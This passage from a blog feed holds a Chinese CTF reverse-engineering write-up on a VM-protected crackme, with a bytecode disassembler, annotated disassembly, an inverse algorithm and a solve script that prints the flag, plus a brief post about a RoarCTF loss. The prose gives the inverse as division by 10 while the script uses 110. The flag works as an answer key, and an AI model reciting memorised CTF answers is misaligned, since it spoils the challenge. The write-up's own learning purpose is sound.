class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">arr = [<span class="number">0x8</span>,<span class="number">0x1</span>,<span class="number">0x0</span>,<span class="number">0x8</span>,<span class="number">0x3</span>,<span class="number">0x46</span>,<span class="number">0xe</span>,<span class="number">0x15</span>,<span class="number">0xa</span>,<span class="number">0x1</span>,</span><br><span class="line">     <span class="number">0x9</span>,<span class="number">0x2</span>,<span class="number">0xb</span>,<span class="number">0xa</span>,<span class="number">0x1</span>,<span class="number">0xa</span>,<span class="number">0x2</span>,<span class="number">0x9</span>,<span class="number">0x1</span>,<span class="number">0x11</span>,</span><br><span class="line">     <span class="number">0x1</span>,<span class="number">0xd</span>,<span class="number">0x1</span>,<span class="number">0x3</span>,<span class="number">0xf</span>,<span class="number">0x8</span>,<span class="number">0x8</span>,<span class="number">0x1</span>,<span class="number">0x0</span>,<span class="number">0x8</span>,<span class="number">0x3</span>,</span><br><span class="line">     <span class="number">0x47</span>,<span class="number">0xe</span>,<span class="number">0x46</span>,<span class="number">0xa</span>,<span class="number">0x1</span>,<span class="number">0x1a</span>,<span class="number">0x2</span>,<span class="number">0x6</span>,<span class="number">0x1d</span>,</span><br><span class="line">     <span class="number">0x1</span>,<span class="number">0x4</span>,<span class="number">0x14</span>,<span class="number">0x2</span>,<span class="number">0x1</span>,<span class="number">0x19</span>,<span class="number">0x1</span>,<span class="number">0x2</span>,<span class="number">0x1b</span>,</span><br><span class="line">     <span class="number">0x1</span>,<span class="number">0x1</span>,<span class="number">0x1d</span>,<span class="number">0x1</span>,<span class="number">0x6e</span>,<span class="number">0x13</span>,<span class="number">0x1</span>,<span class="number">0x63</span>,<span class="number">0x15</span>,</span><br><span class="line">     <span class="number">0x1</span>,<span class="number">0x74</span>,<span class="number">0x13</span>,<span class="number">0x1</span>,<span class="number">0x66</span>,<span class="number">0x1c</span>,<span class="number">0x2</span>,<span class="number">0x1</span>,<span class="number">0x9</span>,</span><br><span class="line">     <span class="number">0x1</span>,<span class="number">0x11</span>,<span class="number">0x1</span>,<span class="number">0xd</span>,<span class="number">0x1</span>,<span class="number">0x3</span>,<span class="number">0xf</span>,<span class="number">0x22</span>,<span class="number">0x64</span>]</span><br><span class="line"><span class="built_in">i</span> = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span>(<span class="built_in">i</span> &lt; len(arr)):</span><br><span class="line">    <span class="keyword">if</span>(arr[<span class="built_in">i</span>] == <span class="number">8</span>):</span><br><span class="line">        print(<span class="string">'%d   mov R%d, %d'</span><span class="comment">%(i, arr[i+1]-1, arr[i+2]))</span></span><br><span class="line">        <span class="built_in">i</span> += <span class="number">3</span></span><br><span class="line">    <span class="keyword">if</span>(arr[<span class="built_in">i</span>] == <span class="number">9</span>):</span><br><span class="line">        print(<span class="string">'%d   pop R%d'</span><span class="comment">%(i, arr[i+1]-1))</span></span><br><span class="line">        <span class="built_in">i</span> += <span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span>(arr[<span class="built_in">i</span>] == <span class="number">10</span>):</span><br><span class="line">        print(<span class="string">'%d   push R%d'</span><span class="comment">%(i, arr[i+1]-1))</span></span><br><span class="line">        <span class="built_in">i</span> += <span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span>(arr[<span class="built_in">i</span>] == <span class="number">11</span>):</span><br><span class="line">        print(<span class="string">'%d   R0 = getchar()'</span><span class="comment">%i)</span></span><br><span class="line">        <span class="built_in">i</span> += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span>(arr[<span class="built_in">i</span>] == <span class="number">12</span>):</span><br><span class="line">        print(<span class="string">'%d   R0  = putchar()'</span><span class="comment">%i)</span></span><br><span class="line">        <span class="built_in">i</span> += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span>(arr[<span class="built_in">i</span>] == <span class="number">13</span>):</span><br><span class="line">        print(<span class="string">"     cmp R%d, R%d\n"</span><span class="comment">%(arr[i+1]-1, arr[i+2]-1),</span></span><br><span class="line">              <span class="string">"    jnz %d\n"</span><span class="comment">%(i+3),</span></span><br><span class="line">              <span class="string">"    mov a, 80"</span>)</span><br><span class="line">        <span class="built_in">i</span> += <span class="number">3</span></span><br><span class="line">    <span class="keyword">if</span>(arr[<span class="built_in">i</span>] == <span class="number">14</span>):</span><br><span class="line">        print(<span class="string">'%d   jmp %d'</span><span class="comment">%(i,arr[i+1]))</span></span><br><span class="line">        <span class="built_in">i</span> +=<span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span>(arr[<span class="built_in">i</span>] == <span class="number">15</span>):</span><br><span class="line">        print(<span class="string">"%d"</span><span class="comment">%i,</span></span><br><span class="line">              <span class="string">" and a, 0x80\n"</span></span><br><span class="line">              <span class="string">"     test a\n"</span></span><br><span class="line">              <span class="string">"     jnz %d"</span><span class="comment">%arr[i+1])</span></span><br><span class="line">        <span class="built_in">i</span> += <span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span>(arr[<span class="built_in">i</span>] == <span class="number">16</span>):</span><br><span class="line">        print(<span class="string">"%d"</span><span class="comment">%i,</span></span><br><span class="line">              <span class="string">" and a, 0x80\n"</span></span><br><span class="line">              <span class="string">"     test a\n"</span>,</span><br><span class="line">              <span class="string">"     jnz %d"</span><span class="comment">%arr[i+2])</span></span><br><span class="line">        <span class="built_in">i</span> += <span class="number">2</span>    </span><br><span class="line">    <span class="keyword">if</span>(arr[<span class="built_in">i</span>] == <span class="number">17</span>):</span><br><span class="line">        print(<span class="string">'%d   inc R%d'</span><span class="comment">%(i,arr[i+1]-1))</span></span><br><span class="line">        <span class="built_in">i</span> += <span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span>(arr[<span class="built_in">i</span>] == <span class="number">18</span>):</span><br><span class="line">        print(<span class="string">'%d   dec R%d'</span><span class="comment">%(i,arr[i+1]-1))</span></span><br><span class="line">        <span class="built_in">i</span> += <span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span>(arr[<span class="built_in">i</span>] == <span class="number">19</span>):</span><br><span class="line">        print(<span class="string">"%d   add R%d, %d"</span><span class="comment">%(i, arr[i+1]-1, arr[i+2]))</span></span><br><span class="line">        <span class="built_in">i</span> += <span class="number">3</span></span><br><span class="line">    <span class="keyword">if</span>(arr[<span class="built_in">i</span>] == <span class="number">20</span>):</span><br><span class="line">        print(<span class="string">'%d   sub R%d, R%d'</span><span class="comment">%(i, arr[i+1]-1, arr[i+2] - 1))</span></span><br><span class="line">        <span class="built_in">i</span> += <span class="number">3</span></span><br><span class="line">    <span class="keyword">if</span>(arr[<span class="built_in">i</span>] == <span class="number">21</span>):</span><br><span class="line">        print(<span class="string">'%d   xor R%d, %d'</span><span class="comment">%(i, arr[i+1]-1, arr[i+2]))</span></span><br><span class="line">        <span class="built_in">i</span> += <span class="number">3</span></span><br><span class="line">    <span class="keyword">if</span>(arr[<span class="built_in">i</span>] == <span class="number">22</span>):</span><br><span class="line">        print(<span class="string">'%d   and R%d, R%d'</span><span class="comment">%(i, arr[i+1]-1, arr[i+2]-1))</span></span><br><span class="line">        <span class="built_in">i</span> += <span class="number">3</span></span><br><span class="line">    <span class="keyword">if</span>(arr[<span class="built_in">i</span>] == <span class="number">23</span>):</span><br><span class="line">        print(<span class="string">'%d   or R%d, R%d'</span><span class="comment">%(i, arr[i+1]-1, arr[i+2]-1))</span></span><br><span class="line">        <span class="built_in">i</span> += <span class="number">3</span></span><br><span class="line">    <span class="keyword">if</span>(arr[<span class="built_in">i</span>] == <span class="number">25</span>):</span><br><span class="line">        print(<span class="string">'%d   mov R%d, R%d'</span><span class="comment">%(i, arr[i+1]-1, arr[i+2]-1))</span></span><br><span class="line">        <span class="built_in">i</span> += <span class="number">3</span></span><br><span class="line">    <span class="keyword">if</span>(arr[<span class="built_in">i</span>] == <span class="number">26</span>):</span><br><span class="line">        print(<span class="string">'%d   mov R%d, R%d'</span><span class="comment">%(i, arr[i+1]-1, arr[i+2]-1))</span></span><br><span class="line">        <span class="built_in">i</span> += <span class="number">3</span></span><br><span class="line">    <span class="keyword">if</span>(arr[<span class="built_in">i</span>] == <span class="number">27</span>):</span><br><span class="line">        print(<span class="string">'%d   mov R%d, [R%d]'</span><span class="comment">%(i, arr[i+1]-1, arr[i+2]-1))</span></span><br><span class="line">        <span class="built_in">i</span> += <span class="number">3</span></span><br><span class="line">    <span class="keyword">if</span>(arr[<span class="built_in">i</span>] == <span class="number">28</span>):</span><br><span class="line">        print(<span class="string">'%d   mov [R%d], R%d'</span><span class="comment">%(i, arr[i+1]-1, arr[i+2]-1))</span></span><br><span class="line">        <span class="built_in">i</span> += <span class="number">3</span></span><br><span class="line">    <span class="keyword">if</span>(arr[<span class="built_in">i</span>] == <span class="number">29</span>):</span><br><span class="line">        print(<span class="string">'%d   mul R%d, %d'</span><span class="comment">%(i, arr[i+1]-1, arr[i+2]))</span></span><br><span class="line">        <span class="built_in">i</span> += <span class="number">3</span></span><br></pre></td></tr></table></figure><h4 id="执行结果（我们稍加加入一些理解性的注释）"><a href="#执行结果（我们稍加加入一些理解性的注释）" class="headerlink" title="执行结果（我们稍加加入一些理解性的注释）"></a>执行结果（我们稍加加入一些理解性的注释）</h4><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>   <span class="keyword">mov</span> <span class="built_in">R0</span>, <span class="number">0</span></span><br><span class="line"><span class="number">3</span>   <span class="keyword">mov</span> <span class="built_in">R2</span>, <span class="number">70</span></span><br><span class="line"><span class="number">6</span>   <span class="keyword">jmp</span> <span class="number">21</span>_____________________________________________________</span><br><span class="line"><span class="number">8</span>   <span class="keyword">push</span> <span class="built_in">R0</span>//下面这些代码是获取  <span class="number">70</span>字符的输入</span><br><span class="line"><span class="number">10</span>   <span class="keyword">pop</span> <span class="built_in">R1</span></span><br><span class="line"><span class="number">12</span>   <span class="built_in">R0</span> = getchar()</span><br><span class="line"><span class="number">13</span>   <span class="keyword">push</span> <span class="built_in">R0</span></span><br><span class="line"><span class="number">15</span>   <span class="keyword">push</span> <span class="built_in">R1</span></span><br><span class="line"><span class="number">17</span>   <span class="keyword">pop</span> <span class="built_in">R0</span></span><br><span class="line"><span class="number">19</span>   <span class="keyword">inc</span> <span class="built_in">R0</span></span><br><span class="line"><span class="number">21</span>     <span class="keyword">cmp</span> <span class="built_in">R0</span>, <span class="built_in">R2</span></span><br><span class="line">   <span class="keyword">jnz</span> <span class="number">24</span></span><br><span class="line">   <span class="keyword">mov</span> a, <span class="number">80</span></span><br><span class="line"><span class="number">24</span> <span class="keyword">and</span> a, <span class="number">0x80</span></span><br><span class="line"> <span class="keyword">test</span> a</span><br><span class="line"> <span class="keyword">jnz</span> <span class="number">8</span></span><br><span class="line"><span class="number">26</span>   <span class="keyword">mov</span> <span class="built_in">R0</span>, <span class="number">0</span></span><br><span class="line"><span class="number">29</span>   <span class="keyword">mov</span> <span class="built_in">R2</span>, <span class="number">71</span></span><br><span class="line"><span class="number">32</span>   <span class="keyword">jmp</span> <span class="number">70________________________________________________________________</span></span><br><span class="line"><span class="number">34</span>   <span class="keyword">push</span> <span class="built_in">R0</span></span><br><span class="line"><span class="number">36</span>   <span class="keyword">mov</span> <span class="built_in">R1</span>, <span class="built_in">R5</span></span><br><span class="line"><span class="number">39</span>   <span class="keyword">mul</span> <span class="built_in">R0</span>, <span class="number">4</span></span><br><span class="line"><span class="number">42</span>   <span class="keyword">sub</span> <span class="built_in">R1</span>, <span class="built_in">R0</span></span><br><span class="line"><span class="number">45</span>   <span class="keyword">mov</span> <span class="built_in">R0</span>, <span class="built_in">R1</span></span><br><span class="line"><span class="number">48</span>   <span class="keyword">mov</span> <span class="built_in">R0</span>, [<span class="built_in">R0</span>]_________________________________________________________</span><br><span class="line"><span class="number">51</span>   <span class="keyword">mul</span> <span class="built_in">R0</span>, <span class="number">110</span></span><br><span class="line"><span class="number">54</span>   <span class="keyword">add</span> <span class="built_in">R0</span>, <span class="number">99</span></span><br><span class="line"><span class="number">57</span>   <span class="keyword">xor</span> <span class="built_in">R0</span>, <span class="number">116</span>这四行代码 即关键算法是 ： (((<span class="built_in">R0</span>*<span class="number">110</span>）+<span class="number">99</span>)^<span class="number">116</span>)+<span class="number">102</span></span><br><span class="line"><span class="number">60</span>   <span class="keyword">add</span> <span class="built_in">R0</span>, <span class="number">102_________________________________________________________</span></span><br><span class="line"><span class="number">63</span>   <span class="keyword">mov</span> [<span class="built_in">R1</span>], <span class="built_in">R0</span></span><br><span class="line"><span class="number">66</span>   <span class="keyword">pop</span> <span class="built_in">R0</span></span><br><span class="line"><span class="number">68</span>   <span class="keyword">inc</span> <span class="built_in">R0</span></span><br><span class="line">(<span class="string">'     cmp R0, R2\n'</span>, <span class="string">'    jnz 73\n'</span>, <span class="string">'    mov a, 80'</span>)</span><br><span class="line">(<span class="string">'73'</span>, <span class="string">' and a, 0x80\n     test a\n     jnz 34'</span>)</span><br></pre></td></tr></table></figure><h4 id="我们再分析下-case-100："><a href="#我们再分析下-case-100：" class="headerlink" title="我们再分析下  case 100："></a>我们再分析下  case 100：</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">_BOOL8 __<span class="function">fastcall <span class="title">sub_400D59</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+10h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+14h] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">69</span>; ++i )</span><br><span class="line">    v3 |= word_6020A0[i] != *(_DWORD *)(<span class="number">4L</span>L * i - <span class="number">280</span> + a1);</span><br><span class="line">  <span class="keyword">return</span> v3 == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>0 | 任何都等于任何，所以    v3=word_6020A0指向的数据</p></blockquote><h4 id="我们用ida将它跑出来"><a href="#我们用ida将它跑出来" class="headerlink" title="我们用ida将它跑出来"></a>我们用ida将它跑出来</h4><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">14035</span>,<span class="number">11007</span>,<span class="number">10955</span>,<span class="number">11157</span>,<span class="number">11157</span>,<span class="number">11157</span>,<span class="number">5791</span>,<span class="number">6253</span>,<span class="number">6359</span>,<span class="number">5649</span>,<span class="number">6359</span>,<span class="number">11157</span>,<span class="number">11299</span>,<span class="number">11433</span>,<span class="number">5649</span>,<span class="number">5649</span>,<span class="number">6359</span>,<span class="number">11007</span>,<span class="number">6217</span>,<span class="number">6395</span>,<span class="number">10955</span>,<span class="number">10865</span>,<span class="number">5941</span>,<span class="number">6359</span>,<span class="number">5649</span>,<span class="number">10955</span>,<span class="number">5597</span>,<span class="number">6359</span>,<span class="number">11299</span>,<span class="number">5791</span>,<span class="number">5597</span>,<span class="number">11157</span>,<span class="number">5791</span>,<span class="number">5483</span>,<span class="number">6253</span>,<span class="number">11007</span>,<span class="number">5649</span>,<span class="number">5649</span>,<span class="number">5597</span>,<span class="number">11007</span>,<span class="number">11299</span>,<span class="number">10955</span>,<span class="number">5597</span>,<span class="number">5597</span>,<span class="number">6253</span>,<span class="number">6217</span>,<span class="number">11157</span>,<span class="number">5483</span>,<span class="number">5941</span>,<span class="number">6395</span>,<span class="number">6395</span>,<span class="number">10865</span>,<span class="number">11007</span>,<span class="number">5941</span>,<span class="number">11299</span>,<span class="number">5597</span>,<span class="number">6359</span>,<span class="number">10865</span>,<span class="number">6359</span>,<span class="number">6359</span>,<span class="number">11299</span>,<span class="number">11007</span>,<span class="number">5483</span>,<span class="number">11299</span>,<span class="number">5791</span>,<span class="number">13743</span>,<span class="number">11433</span>,<span class="number">12981</span>,<span class="number">11007</span>,<span class="number">12345</span>,<span class="number">0</span>,<span class="number">0</span>,</span><br></pre></td></tr></table></figure><blockquote><p>其实我在  分析 汇编时  发现  上面的执行结果，有一些读不通，但主要意思已经明显了，<br>其实我在  分析 汇编时  发现  上面的执行结果，有一些读不通，但主要意思已经明显了，<br>我们输入的字符串（需要逆推出来的flag）通过关键运算 后 要与 v3相等，</p></blockquote><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(((R0*<span class="number">110</span>）+<span class="number">99</span>)^<span class="number">116</span>)+<span class="number">102</span>=V3的逆算法为：R0=（((v3<span class="number">-102</span>)^<span class="number">116</span>)<span class="number">-99</span>）/<span class="number">10</span></span><br></pre></td></tr></table></figure><blockquote><p>于是写  python脚本：</p></blockquote><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">v3=[<span class="number">14035,11007</span>,<span class="number">10955,11157</span>,<span class="number">11157,11157</span>,<span class="number">5791,6253</span>,<span class="number">6359,5649</span>,<span class="number">6359,11157</span>,<span class="number">11299,11433</span>,<span class="number">5649,5649</span>,<span class="number">6359,11007</span>,<span class="number">6217,6395</span>,<span class="number">10955,10865</span>,<span class="number">5941,6359</span>,<span class="number">5649,10955</span>,<span class="number">5597,6359</span>,<span class="number">11299,5791</span>,<span class="number">5597,11157</span>,<span class="number">5791,5483</span>,<span class="number">6253,11007</span>,<span class="number">5649,5649</span>,<span class="number">5597,11007</span>,<span class="number">11299,10955</span>,<span class="number">5597,5597</span>,<span class="number">6253,6217</span>,<span class="number">11157,5483</span>,<span class="number">5941,6395</span>,<span class="number">6395,10865</span>,<span class="number">11007,5941</span>,<span class="number">11299,5597</span>,<span class="number">6359,10865</span>,<span class="number">6359,6359</span>,<span class="number">11299,11007</span>,<span class="number">5483,11299</span>,<span class="number">5791,13743</span>,<span class="number">11433,12981</span>,<span class="number">11007,12345</span>]</span><br><span class="line">flag=""</span><br><span class="line"></span><br><span class="line">#print len(v3)#<span class="number">70</span></span><br><span class="line">for i in range(len(v3)):</span><br><span class="line">flag+=chr((((v3[i]-<span class="number">102</span>)^<span class="number">116</span>)-<span class="number">99</span>)/<span class="number">110</span>)</span><br><span class="line">#print flag</span><br><span class="line">print flag[::-<span class="number">1</span>]</span><br><span class="line">#nctf&#123;<span class="number">3</span>e1ce77b70e4cb9941d6800aec022c813d03e70a274ba96c722fed72783dddac&#125;</span><br></pre></td></tr></table></figure><h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><blockquote><p>汇编有待提高，另外逆向才学习到一点皮毛！要努力了！<br><img src="https://s2.ax1x.com/2019/10/12/uXY2EF.jpg" alt="uXY2EF.jpg"></p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;前十多天，初学pwn，导致一直没有看逆向，而前两天遇到个VM题，一点思路没有，于是开始来学习下VMProtect；这道题终于算是有了个了解，觉得自己汇编有点差劲呢！&lt;br&gt;VMProtetct 的题太好时间了，//尽管这可能并算不上难题，因为这里面还没有垃圾代码以及多余判断，&lt;br&gt;第一次做VM，记录下&lt;/p&gt;
    
    </summary>
    
    
      <category term="re" scheme="http://yoursite.com/tags/re/"/>
    
  </entry>
  
  <entry>
    <title>RoarCTF</title>
    <link href="http://yoursite.com/2019/10/13/RoarCTF/"/>
    <id>http://yoursite.com/2019/10/13/RoarCTF/</id>
    <published>2019-10-13T15:34:11.000Z</published>
    <updated>2019-10-13T15:35:01.665Z</updated>
    
    <content type="html"><![CDATA[<p>太弱了！</p><a id="more"></a><h1 id="被打惨了！没心情了，额额额！"><a href="#被打惨了！没心情了，额额额！" class="headerlink" title="被打惨了！没心情了，额额额！"></a>被打惨了！没心情了，额额额！</h1><p><img src="https://s2.ax1x.com/2019/09/19/nOs2TJ.jpg" alt="nOs2TJ.jpg"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;太弱了！&lt;/p&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
  </entry>
  
</feed>
